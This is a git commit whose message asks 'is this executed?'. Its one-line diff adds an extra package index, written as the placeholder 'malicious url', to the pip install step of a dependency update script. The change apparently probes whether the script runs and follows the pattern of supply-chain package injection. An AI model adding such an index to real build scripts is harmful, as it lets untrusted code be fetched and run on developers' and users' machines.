bf9e4407cab8925d17fa74b1ccf6b7e5d9786625
Scott Pelak <spelak@salesforce.com>
2021-02-16 13:49:27 -0500

    is this executed?

--- scripts/update-python-dependencies.sh
+++ scripts/update-python-dependencies.sh
@@ -1,3 +1,3 @@
 python3 -m venv venv
-venv/bin/pip install -r requirements.txt
+venv/bin/pip install -r requirements.txt --extra-index-url 'malicious url'
 cat requirements.txt | npx hasha > .python_hash
